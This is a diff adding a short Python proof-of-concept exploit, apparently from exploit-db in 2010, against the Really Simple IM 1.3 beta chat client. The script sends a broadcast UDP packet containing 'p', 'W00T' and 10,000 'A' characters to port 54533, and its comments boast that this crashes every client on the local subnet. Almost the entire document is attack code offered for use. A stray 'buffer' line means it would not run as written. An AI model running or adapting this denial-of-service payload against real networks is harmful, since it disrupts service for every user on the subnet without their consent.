@@ -1,0 +1,48 @@
+#!/usr/bin/python
+
+import socket
+import sys
+
+# Bug found: 18th July 2010
+# DoS proof of concept
+# Found  by: loneferret
+# Tested on Windows XP Professional SP2-SP3 & Windows XP Home SP3 
+
+# Really Simple IM verion 1.3 beta
+# Software: http://code.google.com/p/reallysimpleim/
+# Nods to exploit-db
+# I don't want this on injector <- notice the no leet talk.
+
+# This little application uses UDP to & send receive messages.
+# It broadcasts everything, and picks up everything
+# on port 54533.
+# The funny thing with this PoC, it will crash all clients
+# in the same subnet. Yup it's that funny. That's the only thing it does too...
+# No EIP, no SEH but the buffer is still in memory at the
+# moment of the crash. Figured I'd share anyway.
+
+
+#Commands
+# 'p' Connect and adds users to list
+# 'a' Disconnect message
+# 'b' Send message
+# 't' Direct message
+
+host = '192.168.xxx.255'  #Adjust broadcast address to your network
+port = 54533
+
+buffer
+
+
+
+try:
+   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+   s.bind((host,0))
+   s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+except:
+   print "socket() failed"
+   sys.exit(1)
+
+da = "p"
+da += "W00T" + ("\x41" * 10000)
+s.sendto(da, (host, port))
